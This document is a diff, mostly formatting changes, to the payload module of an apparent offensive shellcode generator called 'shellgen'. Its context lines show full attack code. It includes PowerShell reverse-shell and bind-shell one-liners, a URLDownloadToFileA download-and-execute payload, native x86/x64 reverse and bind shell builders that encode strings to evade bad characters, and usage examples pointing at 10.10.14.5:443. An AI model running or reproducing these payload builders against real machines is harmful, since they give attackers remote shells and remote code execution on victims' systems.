@@ -9,7 +9,8 @@ used by the architecture-specific generators.
 from lib.color_printer import printer
 
 
-def windows_messagebox(title="Pwned", message="Hello from shellgen!", bad_chars=None):
+def windows_messagebox(title="Pwned", message="Hello from shellgen!",
+                       bad_chars=None):
     """
     Build a Windows MessageBox payload.
 
@@ -37,13 +38,10 @@ def windows_messagebox(title="Pwned", message="Hello from shellgen!", bad_chars=
     return {
         "bad_chars": bad_chars,
         "calls": [
-            {
-                "api": "MessageBoxA",
-                "dll": "user32.dll",
-                "args": [0, message, title, 0]
-            }
+            {"api": "MessageBoxA", "dll": "user32.dll",
+             "args": [0, message, title, 0]}
         ],
-        "exit": True
+        "exit": True,
     }
 
 
@@ -65,17 +63,16 @@ def windows_winexec(command, show_window=1, bad_chars=None):
     return {
         "bad_chars": bad_chars,
         "calls": [
-            {
-                "api": "WinExec",
-                "dll": "kernel32.dll",
-                "args": [command, show_window]
-            }
+            {"api": "WinExec", "dll": "kernel32.dll",
+             "args": [command, show_window]}
         ],
-        "exit": True
+        "exit": True,
     }
 
 
-def windows_download_exec(url, save_path="C:\\\\windows\\\\temp\\\\payload.exe", bad_chars=None):
+def windows_download_exec(
+        url, save_path="C:\\\\windows\\\\temp\\\\payload.exe", bad_chars=None
+):
     """
     Build a Windows URLDownloadToFileA + WinExec payload.
 
@@ -100,15 +97,11 @@ def windows_download_exec(url, save_path="C:\\\\windows\\\\temp\\\\payload.exe",
             {
                 "api": "URLDownloadToFileA",
                 "dll": "urlmon.dll",
-                "args": [0, url, save_path, 0, 0]
+                "args": [0, url, save_path, 0, 0],
             },
-            {
-                "api": "WinExec",
-                "dll": "kernel32.dll",
-                "args": [save_path, 1]
-            }
+            {"api": "WinExec", "dll": "kernel32.dll", "args": [save_path, 1]},
         ],
-        "exit": True
+        "exit": True,
     }
 
 
@@ -144,24 +137,27 @@ def windows_createprocess(command, show_window=1, bad_chars=None):
                 "api": "CreateProcessA",
                 "dll": "kernel32.dll",
                 "args": [
-                    0,              # lpApplicationName (NULL = use command line)
-                    command,        # lpCommandLine
-                    0,              # lpProcessAttributes (NULL)
-                    0,              # lpThreadAttributes (NULL)
-                    0,              # bInheritHandles (FALSE)
-                    0,              # dwCreationFlags (0)
-                    0,              # lpEnvironment (NULL = parent's environment)
-                    0,              # lpCurrentDirectory (NULL = parent's directory)
-                    "REG:esp",      # lpStartupInfo (pointer to STARTUPINFOA on stack)
-                    "REG:esp"       # lpProcessInformation (pointer on stack)
-                ]
+                    0,  # lpApplicationName (NULL = use command line)
+                    command,  # lpCommandLine
+                    0,  # lpProcessAttributes (NULL)
+                    0,  # lpThreadAttributes (NULL)
+                    0,  # bInheritHandles (FALSE)
+                    0,  # dwCreationFlags (0)
+                    0,  # lpEnvironment (NULL = parent's environment)
+                    0,  # lpCurrentDirectory (NULL = parent's directory)
+                    "REG:esp",
+                    # lpStartupInfo (pointer to STARTUPINFOA on stack)
+                    "REG:esp",  # lpProcessInformation (pointer on stack)
+                ],
             }
         ],
-        "exit": True
+        "exit": True,
     }
 
 
-def windows_shellexecute(file_or_url, operation="open", parameters="", show_cmd=1, bad_chars=None):
+def windows_shellexecute(
+        file_or_url, operation="open", parameters="", show_cmd=1, bad_chars=None
+):
     """
     Build a Windows ShellExecuteA payload.
 
@@ -187,9 +183,9 @@ def windows_shellexecute(file_or_url, operation="open", parameters="", show_cmd=
         bad_chars = {0x00}
 
     args = [
-        0,              # hwnd (NULL)
-        operation,      # lpOperation ("open", "runas", etc.)
-        file_or_url,    # lpFile
+        0,  # hwnd (NULL)
+        operation,  # lpOperation ("open", "runas", etc.)
+        file_or_url,  # lpFile
     ]
 
     # Only add parameters if provided (avoid empty string if not needed)
@@ -198,22 +194,14 @@ def windows_shellexecute(file_or_url, operation="open", parameters="", show_cmd=
     else:
         args.append(0)  # lpParameters (NULL)
 
-    args.extend([
-        0,              # lpDirectory (NULL = current directory)
-        show_cmd        # nShowCmd
-    ])
+    args.extend(
+        [0, show_cmd])  # lpDirectory (NULL = current directory)  # nShowCmd
 
     return {
         "bad_chars": bad_chars,
         "pre_resolve": True,  # Use pre-resolution for efficiency
-        "calls": [
-            {
-                "api": "ShellExecuteA",
-                "dll": "shell32.dll",
-                "args": args
-            }
-        ],
-        "exit": True
+        "calls": [{"api": "ShellExecuteA", "dll": "shell32.dll", "args": args}],
+        "exit": True,
     }
 
 
@@ -236,14 +224,8 @@ def windows_system(command, bad_chars=None):
 
     return {
         "bad_chars": bad_chars,
-        "calls": [
-            {
-                "api": "system",
-                "dll": "msvcrt.dll",
-                "args": [command]
-            }
-        ],
-        "exit": True
+        "calls": [{"api": "system", "dll": "msvcrt.dll", "args": [command]}],
+        "exit": True,
     }
 
 
@@ -266,18 +248,15 @@ def windows_reverse_shell_powershell(host, port, bad_chars=None):
         bad_chars = {0x00}
 
     # PowerShell reverse shell
-    ps_cmd = f'powershell -nop -c "$c=New-Object Net.Sockets.TCPClient(\'{host}\',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$o2=$o+\'PS \'+(pwd).Path+\'> \';$sb=([text.encoding]::ASCII).GetBytes($o2);$s.Write($sb,0,$sb.Length);$s.Flush()}};$c.Close()"'
+    ps_cmd = f"powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{host}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$o2=$o+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($o2);$s.Write($sb,0,$sb.Length);$s.Flush()}};$c.Close()\""
 
     return {
         "bad_chars": bad_chars,
         "calls": [
-            {
-                "api": "WinExec",
-                "dll": "kernel32.dll",
-                "args": [ps_cmd, 0]  # SW_HIDE
-            }
+            {"api": "WinExec", "dll": "kernel32.dll", "args": [ps_cmd, 0]}
+            # SW_HIDE
         ],
-        "exit": True
+        "exit": True,
     }
 
 
@@ -315,25 +294,28 @@ def windows_reverse_shell(host, port, bad_chars=None, shell="cmd.exe"):
         bad_chars = {0x00}
 
     # Convert IP address to dword (network byte order)
-    ip_parts = [int(x) for x in host.split('.')]
-    ip_dword = (ip_parts[0]) | (ip_parts[1] << 8) | (ip_parts[2] << 16) | (ip_parts[3] << 24)
+    ip_parts = [int(x) for x in host.split(".")]
+    ip_dword = (
+            (ip_parts[0]) | (ip_parts[1] << 8) | (ip_parts[2] << 16) | (
+                ip_parts[3] << 24)
+    )
 
     # Port in network byte order (swap bytes)
     port_word = ((port & 0xFF) << 8) | (port >> 8)
 
     # Build shell string push instructions using NEG encoding
     # We push the string in reverse (right to left) in 4-byte chunks
-    shell_bytes = shell.encode('ascii') + b'\x00'  # null-terminate
+    shell_bytes = shell.encode("ascii") + b"\x00"  # null-terminate
 
     # Pad to multiple of 4
     while len(shell_bytes) % 4 != 0:
-        shell_bytes = b'\x00' + shell_bytes
+        shell_bytes = b"\x00" + shell_bytes
 
     # Generate push instructions for shell string (reverse order)
     shell_asm = ""
     for i in range(len(shell_bytes) - 4, -1, -4):
-        chunk = shell_bytes[i:i+4]
-        dword = int.from_bytes(chunk, byteorder='little')
+        chunk = shell_bytes[i: i + 4]
+        dword = int.from_bytes(chunk, byteorder="little")
 
         # Use NEG encoding: neg eax to get the value
         # neg x = -x = ~x + 1 (two's complement)
@@ -352,16 +334,17 @@ def windows_reverse_shell(host, port, bad_chars=None, shell="cmd.exe"):
             {
                 "api": "TerminateProcess",
                 "dll": "kernel32.dll",
-                "args": []  # Dummy, won't be called via generator
+                "args": [],  # Dummy, won't be called via generator
             },
             {
                 "api": "CreateProcessA",
                 "dll": "kernel32.dll",
-                "args": []  # Dummy, won't be called via generator
+                "args": [],  # Dummy, won't be called via generator
             },
             {
                 "api": "_CUSTOM_REVERSE_SHELL",
-                "dll": "ws2_32.dll",  # This will trigger LoadLibraryA for ws2_32.dll
+                "dll": "ws2_32.dll",
+                # This will trigger LoadLibraryA for ws2_32.dll
                 "args": [],
                 "custom_asm": f"""
     ; ===== After boilerplate with pre_resolve, we have: =====
@@ -503,10 +486,10 @@ def windows_reverse_shell(host, port, bad_chars=None, shell="cmd.exe"):
     push ecx                      ; uExitCode = 0
     push 0xFFFFFFFF               ; hProcess = -1 (current process)
     call dword ptr [ebp+0x14]     ; Call TerminateProcess from pre-resolve
-"""
-            }
+""",
+            },
         ],
-        "exit": False  # We handle exit manually with TerminateProcess
+        "exit": False,  # We handle exit manually with TerminateProcess
     }
 
 
@@ -540,8 +523,11 @@ def windows_reverse_shell_x64(host, port, bad_chars=None, shell="cmd.exe"):
         bad_chars = {0x00}
 
     # Convert IP address to qword (network byte order)
-    ip_parts = [int(x) for x in host.split('.')]
-    ip_dword = (ip_parts[0]) | (ip_parts[1] << 8) | (ip_parts[2] << 16) | (ip_parts[3] << 24)
+    ip_parts = [int(x) for x in host.split(".")]
+    ip_dword = (
+            (ip_parts[0]) | (ip_parts[1] << 8) | (ip_parts[2] << 16) | (
+                ip_parts[3] << 24)
+    )
 
     # Port in network byte order (swap bytes)
     port_word = ((port & 0xFF) << 8) | (port >> 8)
@@ -552,20 +538,22 @@ def windows_reverse_shell_x64(host, port, bad_chars=None, shell="cmd.exe"):
 
     # Build shell string storage instructions using NEG encoding for x64
     # We store the string in memory at [r15+0x180] using 8-byte chunks
-    shell_bytes = shell.encode('ascii') + b'\x00'  # null-terminate
+    shell_bytes = shell.encode("ascii") + b"\x00"  # null-terminate
 
     # Pad to multiple of 8 for x64
     while len(shell_bytes) % 8 != 0:
-        shell_bytes = b'\x00' + shell_bytes
+        shell_bytes = b"\x00" + shell_bytes
 
     # Generate mov instructions for shell string (reverse order for little-endian)
     shell_asm = "    mov rdx, r15                    ; RDX = base for shell string\n"
-    shell_asm += "    add rdx, 0x180                  ; Offset for shell string storage\n"
+    shell_asm += (
+        "    add rdx, 0x180                  ; Offset for shell string storage\n"
+    )
 
     offset = 0
     for i in range(len(shell_bytes) - 8, -1, -8):
-        chunk = shell_bytes[i:i+8]
-        qword = int.from_bytes(chunk, byteorder='little')
+        chunk = shell_bytes[i: i + 8]
+        qword = int.from_bytes(chunk, byteorder="little")
 
         # Use NEG encoding: neg rax to get the value
         # For x64, we encode as: -encoded = qword => encoded = -qword
@@ -573,7 +561,9 @@ def windows_reverse_shell_x64(host, port, bad_chars=None, shell="cmd.exe"):
 
         shell_asm += f"    mov rax, 0x{encoded:016x}   ; Encoded value\n"
         shell_asm += f"    neg rax                       ; NEG to get 0x{qword:016x}\n"
-        shell_asm += f"    mov [rdx+{offset:#x}], rax          ; Store shell string chunk\n"
+        shell_asm += (
+            f"    mov [rdx+{offset:#x}], rax          ; Store shell string chunk\n"
+        )
         offset += 8
 
     return {
@@ -583,16 +573,17 @@ def windows_reverse_shell_x64(host, port, bad_chars=None, shell="cmd.exe"):
             {
                 "api": "TerminateProcess",
                 "dll": "kernel32.dll",
-                "args": []  # Dummy, won't be called via generator
+                "args": [],  # Dummy, won't be called via generator
             },
             {
                 "api": "CreateProcessA",
                 "dll": "kernel32.dll",
-                "args": []  # Dummy, won't be called via generator
+                "args": [],  # Dummy, won't be called via generator
             },
             {
                 "api": "_CUSTOM_REVERSE_SHELL_X64",
-                "dll": "ws2_32.dll",  # This will trigger LoadLibraryA for ws2_32.dll
+                "dll": "ws2_32.dll",
+                # This will trigger LoadLibraryA for ws2_32.dll
                 "args": [],
                 "custom_asm": f"""
     ; ===== After boilerplate with pre_resolve, we have: =====
@@ -724,10 +715,10 @@ def windows_reverse_shell_x64(host, port, bad_chars=None, shell="cmd.exe"):
     sub rsp, 0x20                   ; Shadow space
     call rax                        ; Call TerminateProcess
     add rsp, 0x20                   ; Clean up shadow space
-"""
-            }
+""",
+            },
         ],
-        "exit": False  # We handle exit manually with TerminateProcess
+        "exit": False,  # We handle exit manually with TerminateProcess
     }
 
 
@@ -777,17 +768,17 @@ def windows_bind_shell(port, bad_chars=None, shell="cmd.exe"):
 
     # Build shell string push instructions using NEG encoding
     # We push the string in reverse (right to left) in 4-byte chunks
-    shell_bytes = shell.encode('ascii') + b'\x00'  # null-terminate
+    shell_bytes = shell.encode("ascii") + b"\x00"  # null-terminate
 
     # Pad to multiple of 4
     while len(shell_bytes) % 4 != 0:
-        shell_bytes = b'\x00' + shell_bytes
+        shell_bytes = b"\x00" + shell_bytes
 
     # Generate push instructions for shell string (reverse order)
     shell_asm = ""
     for i in range(len(shell_bytes) - 4, -1, -4):
-        chunk = shell_bytes[i:i+4]
-        dword = int.from_bytes(chunk, byteorder='little')
+        chunk = shell_bytes[i: i + 4]
+        dword = int.from_bytes(chunk, byteorder="little")
 
         # Use NEG encoding: neg eax to get the value
         # neg x = -x = ~x + 1 (two's complement)
@@ -806,16 +797,17 @@ def windows_bind_shell(port, bad_chars=None, shell="cmd.exe"):
             {
                 "api": "TerminateProcess",
                 "dll": "kernel32.dll",
-                "args": []  # Dummy, won't be called via generator
+                "args": [],  # Dummy, won't be called via generator
             },
             {
                 "api": "CreateProcessA",
                 "dll": "kernel32.dll",
-                "args": []  # Dummy, won't be called via generator
+                "args": [],  # Dummy, won't be called via generator
             },
             {
                 "api": "_CUSTOM_BIND_SHELL",
-                "dll": "ws2_32.dll",  # This will trigger LoadLibraryA for ws2_32.dll
+                "dll": "ws2_32.dll",
+                # This will trigger LoadLibraryA for ws2_32.dll
                 "args": [],
                 "custom_asm": f"""
     ; ===== After boilerplate with pre_resolve, we have: =====
@@ -978,10 +970,10 @@ def windows_bind_shell(port, bad_chars=None, shell="cmd.exe"):
     push ecx                      ; uExitCode = 0
     push 0xFFFFFFFF               ; hProcess = -1 (current process)
     call dword ptr [ebp+0x14]     ; Call TerminateProcess from pre-resolve
-"""
-            }
+""",
+            },
         ],
-        "exit": False  # We handle exit manually with TerminateProcess
+        "exit": False,  # We handle exit manually with TerminateProcess
     }
 
 
@@ -1020,20 +1012,22 @@ def windows_bind_shell_x64(port, bad_chars=None, shell="cmd.exe"):
 
     # Build shell string storage instructions using NEG encoding for x64
     # We store the string in memory at [r15+0x180] using 8-byte chunks
-    shell_bytes = shell.encode('ascii') + b'\x00'  # null-terminate
+    shell_bytes = shell.encode("ascii") + b"\x00"  # null-terminate
 
     # Pad to multiple of 8 for x64
     while len(shell_bytes) % 8 != 0:
-        shell_bytes = b'\x00' + shell_bytes
+        shell_bytes = b"\x00" + shell_bytes
 
     # Generate mov instructions for shell string (reverse order for little-endian)
     shell_asm = "    mov rdx, r15                    ; RDX = base for shell string\n"
-    shell_asm += "    add rdx, 0x180                  ; Offset for shell string storage\n"
+    shell_asm += (
+        "    add rdx, 0x180                  ; Offset for shell string storage\n"
+    )
 
     offset = 0
     for i in range(len(shell_bytes) - 8, -1, -8):
-        chunk = shell_bytes[i:i+8]
-        qword = int.from_bytes(chunk, byteorder='little')
+        chunk = shell_bytes[i: i + 8]
+        qword = int.from_bytes(chunk, byteorder="little")
 
         # Use NEG encoding: neg rax to get the value
         # For x64, we encode as: -encoded = qword => encoded = -qword
@@ -1041,7 +1035,9 @@ def windows_bind_shell_x64(port, bad_chars=None, shell="cmd.exe"):
 
         shell_asm += f"    mov rax, 0x{encoded:016x}   ; Encoded value\n"
         shell_asm += f"    neg rax                       ; NEG to get 0x{qword:016x}\n"
-        shell_asm += f"    mov [rdx+{offset:#x}], rax          ; Store shell string chunk\n"
+        shell_asm += (
+            f"    mov [rdx+{offset:#x}], rax          ; Store shell string chunk\n"
+        )
         offset += 8
 
     return {
@@ -1051,16 +1047,17 @@ def windows_bind_shell_x64(port, bad_chars=None, shell="cmd.exe"):
             {
                 "api": "TerminateProcess",
                 "dll": "kernel32.dll",
-                "args": []  # Dummy, won't be called via generator
+                "args": [],  # Dummy, won't be called via generator
             },
             {
                 "api": "CreateProcessA",
                 "dll": "kernel32.dll",
-                "args": []  # Dummy, won't be called via generator
+                "args": [],  # Dummy, won't be called via generator
             },
             {
                 "api": "_CUSTOM_BIND_SHELL_X64",
-                "dll": "ws2_32.dll",  # This will trigger LoadLibraryA for ws2_32.dll
+                "dll": "ws2_32.dll",
+                # This will trigger LoadLibraryA for ws2_32.dll
                 "args": [],
                 "custom_asm": f"""
     ; ===== After boilerplate with pre_resolve, we have: =====
@@ -1231,10 +1228,10 @@ def windows_bind_shell_x64(port, bad_chars=None, shell="cmd.exe"):
     sub rsp, 0x20                   ; Shadow space
     call rax                        ; Call TerminateProcess
     add rsp, 0x20                   ; Clean up shadow space
-"""
-            }
+""",
+            },
         ],
-        "exit": False  # We handle exit manually with TerminateProcess
+        "exit": False,  # We handle exit manually with TerminateProcess
     }
 
 
@@ -1264,7 +1261,7 @@ def windows_bind_shell_simple(port, command="cmd.exe", bad_chars=None):
         bad_chars = {0x00}
 
     # PowerShell bind shell one-liner
-    ps_bind = f'powershell -nop -c "$l=New-Object Net.Sockets.TcpListener({port});$l.Start();$c=$l.AcceptTcpClient();$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+\'PS \'+(pwd).Path+\'> \';$sb=[Text.Encoding]::ASCII.GetBytes($sb2);$s.Write($sb,0,$sb.Length);$s.Flush()}};$c.Close();$l.Stop()"'
+    ps_bind = f"powershell -nop -c \"$l=New-Object Net.Sockets.TcpListener({port});$l.Start();$c=$l.AcceptTcpClient();$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sb=[Text.Encoding]::ASCII.GetBytes($sb2);$s.Write($sb,0,$sb.Length);$s.Flush()}};$c.Close();$l.Stop()\""
 
     return {
         "bad_chars": bad_chars,
@@ -1272,10 +1269,11 @@ def windows_bind_shell_simple(port, command="cmd.exe", bad_chars=None):
             {
                 "api": "WinExec",
                 "dll": "kernel32.dll",
-                "args": [ps_bind if command == "cmd.exe" else command, 0]  # SW_HIDE
+                "args": [ps_bind if command == "cmd.exe" else command, 0],
+                # SW_HIDE
             }
         ],
-        "exit": True
+        "exit": True,
     }
 
 
@@ -1303,11 +1301,12 @@ def linux_execve(command="/bin/sh", arch="arm", bad_chars=None, shell=None):
         "bad_chars": bad_chars,
         "payload": "execve",
         "command": exec_command,
-        "arch": arch
+        "arch": arch,
     }
 
 
-def linux_reverse_shell(host, port, arch="arm", bad_chars=None, shell="/bin/sh"):
+def linux_reverse_shell(host, port, arch="arm", bad_chars=None,
+                        shell="/bin/sh"):
     """
     Build a Linux reverse shell payload.
 
@@ -1331,7 +1330,7 @@ def linux_reverse_shell(host, port, arch="arm", bad_chars=None, shell="/bin/sh")
         "host": host,
         "port": port,
         "shell": shell,
-        "arch": arch
+        "arch": arch,
     }
 
 
@@ -1365,7 +1364,7 @@ def linux_bind_shell(port, arch="arm", bad_chars=None, shell="/bin/sh"):
         "payload": "bind_shell",
         "port": port,
         "shell": shell,
-        "arch": arch
+        "arch": arch,
     }
 
 
@@ -1373,33 +1372,85 @@ def linux_bind_shell(port, arch="arm", bad_chars=None, shell="/bin/sh"):
 # Format: "name": (function, description, [supported_architectures])
 PAYLOADS = {
     "windows": {
-        "messagebox": (windows_messagebox, "Display MessageBox dialog", ["x86", "x64"]),
-        "winexec": (windows_winexec, "Execute commands via WinExec", ["x86", "x64"]),
-        "createprocess": (windows_createprocess, "Execute via CreateProcessA (flexible process creation)", ["x86", "x64"]),
-        "shellexecute": (windows_shellexecute, "Execute via ShellExecuteA (programs/URLs with verbs)", ["x86", "x64"]),
-        "system": (windows_system, "Execute via system() from msvcrt.dll (C runtime)", ["x86", "x64"]),
-        "download_exec": (windows_download_exec, "Download file (URLDownloadToFile) and execute", ["x86", "x64"]),
-        "reverse_shell": (windows_reverse_shell, "Native socket reverse shell (runs in current process)", ["x86"]),
-        "reverse_shell_x64": (windows_reverse_shell_x64, "Native socket reverse shell", ["x64"]),
-        "reverse_shell_powershell": (windows_reverse_shell_powershell, "PowerShell reverse shell (spawns child process)", ["x86", "x64"]),
-        "bind_shell": (windows_bind_shell, "Native socket bind shell (listens for connections)", ["x86"]),
-        "bind_shell_x64": (windows_bind_shell_x64, "Native socket bind shell", ["x64"]),
-        "bind_shell_simple": (windows_bind_shell_simple, "PowerShell bind shell (simple, spawns child process)", ["x86", "x64"]),
+        "messagebox": (windows_messagebox, "Display MessageBox dialog",
+                       ["x86", "x64"]),
+        "winexec": (windows_winexec, "Execute commands via WinExec",
+                    ["x86", "x64"]),
+        "createprocess": (
+            windows_createprocess,
+            "Execute via CreateProcessA (flexible process creation)",
+            ["x86", "x64"],
+        ),
+        "shellexecute": (
+            windows_shellexecute,
+            "Execute via ShellExecuteA (programs/URLs with verbs)",
+            ["x86", "x64"],
+        ),
+        "system": (
+            windows_system,
+            "Execute via system() from msvcrt.dll (C runtime)",
+            ["x86", "x64"],
+        ),
+        "download_exec": (
+            windows_download_exec,
+            "Download file (URLDownloadToFile) and execute",
+            ["x86", "x64"],
+        ),
+        "reverse_shell": (
+            windows_reverse_shell,
+            "Native socket reverse shell (runs in current process)",
+            ["x86"],
+        ),
+        "reverse_shell_x64": (
+            windows_reverse_shell_x64,
+            "Native socket reverse shell",
+            ["x64"],
+        ),
+        "reverse_shell_powershell": (
+            windows_reverse_shell_powershell,
+            "PowerShell reverse shell (spawns child process)",
+            ["x86", "x64"],
+        ),
+        "bind_shell": (
+            windows_bind_shell,
+            "Native socket bind shell (listens for connections)",
+            ["x86"],
+        ),
+        "bind_shell_x64": (windows_bind_shell_x64, "Native socket bind shell",
+                           ["x64"]),
+        "bind_shell_simple": (
+            windows_bind_shell_simple,
+            "PowerShell bind shell (simple, spawns child process)",
+            ["x86", "x64"],
+        ),
     },
     "linux": {
-        "execve": (linux_execve, "Execute commands via execve syscall", ["arm", "arm64", "x86", "x64"]),
-        "reverse_shell": (linux_reverse_shell, "TCP reverse shell (socket + execve)", ["arm", "arm64", "x86", "x64"]),
-        "bind_shell": (linux_bind_shell, "TCP bind shell (listens + execve)", ["arm", "arm64", "x86", "x64"]),
-    }
+        "execve": (
+            linux_execve,
+            "Execute commands via execve syscall",
+            ["arm", "arm64", "x86", "x64"],
+        ),
+        "reverse_shell": (
+            linux_reverse_shell,
+            "TCP reverse shell (socket + execve)",
+            ["arm", "arm64", "x86", "x64"],
+        ),
+        "bind_shell": (
+            linux_bind_shell,
+            "TCP bind shell (listens + execve)",
+            ["arm", "arm64", "x86", "x64"],
+        ),
+    },
 }
 
 
 def list_payloads():
     """Display a formatted, colorized list of all available payloads with architecture support."""
     # Print header
-    printer.print_section("\n" + "="*70, "bold green")
-    printer.print_section("  Shellcode Generator - Available Payloads", "bold green")
-    printer.print_section("="*70 + "\n", "bold green")
+    printer.print_section("\n" + "=" * 70, "bold green")
+    printer.print_section("  Shellcode Generator - Available Payloads",
+                          "bold green")
+    printer.print_section("=" * 70 + "\n", "bold green")
 
     # Windows payloads with architecture display
     printer.print_section("Windows Payloads:", "bold cyan")
@@ -1442,7 +1493,7 @@ def list_payloads():
     printer.print_table(
         columns=["Windows Payload", "x86", "x64"],
         rows=win_rows,
-        title="Windows Architecture Support"
+        title="Windows Architecture Support",
     )
 
     # Build matrix for Linux payloads
@@ -1458,7 +1509,7 @@ def list_payloads():
     printer.print_table(
         columns=["Linux Payload", "x86", "x64", "ARM", "ARM64"],
         rows=linux_rows,
-        title="Linux Architecture Support"
+        title="Linux Architecture Support",
     )
 
     # Example usage
@@ -1466,35 +1517,56 @@ def list_payloads():
     print()
 
     printer.print_text("  Windows MessageBox (x86):", "bold yellow")
-    printer.print_text("    ./shellgen.sh --platform windows --payload messagebox \\", "cyan")
-    printer.print_text("                  --title \"Test\" --message \"Hello World\" --arch x86", "cyan")
+    printer.print_text(
+        "    ./shellgen.sh --platform windows --payload messagebox \\", "cyan"
+    )
+    printer.print_text(
+        '                  --title "Test" --message "Hello World" --arch x86',
+        "cyan"
+    )
 
     print()
     printer.print_text("  Windows Reverse Shell (x64):", "bold yellow")
-    printer.print_text("    ./shellgen.sh --platform windows --payload reverse_shell_x64 \\", "cyan")
-    printer.print_text("                  --host 10.10.14.5 --port 443 --arch x64", "cyan")
+    printer.print_text(
+        "    ./shellgen.sh --platform windows --payload reverse_shell_x64 \\",
+        "cyan"
+    )
+    printer.print_text(
+        "                  --host 10.10.14.5 --port 443 --arch x64", "cyan"
+    )
 
     print()
     printer.print_text("  Linux Reverse Shell (ARM64):", "bold yellow")
-    printer.print_text("    ./shellgen.sh --platform linux --payload reverse_shell \\", "cyan")
-    printer.print_text("                  --host 10.10.14.5 --port 443 --arch arm64", "cyan")
+    printer.print_text(
+        "    ./shellgen.sh --platform linux --payload reverse_shell \\", "cyan"
+    )
+    printer.print_text(
+        "                  --host 10.10.14.5 --port 443 --arch arm64", "cyan"
+    )
 
     print()
     printer.print_text("  Python Format Output:", "bold yellow")
-    printer.print_text("    ./shellgen.sh --platform linux --payload execve \\", "cyan")
-    printer.print_text("                  --cmd \"whoami\" --arch arm64 --format python", "cyan")
+    printer.print_text("    ./shellgen.sh --platform linux --payload execve \\",
+                       "cyan")
+    printer.print_text(
+        '                  --cmd "whoami" --arch arm64 --format python', "cyan"
+    )
 
     print()  # Blank line
 
     # Usage hint
     printer.print_section("Usage:", "bold green")
-    printer.print_text("  shellgen_cli.py --platform <platform> --payload <name> [options]", "cyan")
+    printer.print_text(
+        "  shellgen_cli.py --platform <platform> --payload <name> [options]",
+        "cyan"
+    )
     printer.print_text("  shellgen_cli.py --help", "cyan")
 
     # Add helpful tip
     print()
     tip = "💡 TIP: Use --arch to specify target architecture (x86, x64, arm, arm64)\n         Use --format to choose output format (asm, python, c, raw, pyasm)\n         Use --bad-chars to avoid specific bytes (e.g., --bad-chars 00,0a,0d)"
-    printer.print_panel(tip, title="Quick Tips", style="cyan", border_style="cyan")
+    printer.print_panel(tip, title="Quick Tips", style="cyan",
+                        border_style="cyan")
 
     return ""  # Return empty string for backward compatibility
 
@@ -1514,10 +1586,12 @@ def get_payload_builder(platform, payload_name):
         ValueError: If platform or payload not found
     """
     if platform not in PAYLOADS:
-        raise ValueError(f"Unknown platform: {platform}. Use 'windows' or 'linux'")
+        raise ValueError(
+            f"Unknown platform: {platform}. Use 'windows' or 'linux'")
 
     if payload_name not in PAYLOADS[platform]:
-        raise ValueError(f"Unknown payload '{payload_name}' for platform '{platform}'")
+        raise ValueError(
+            f"Unknown payload '{payload_name}' for platform '{platform}'")
 
     # Return just the function (first element of tuple: function, description, archs)
     return PAYLOADS[platform][payload_name][0]
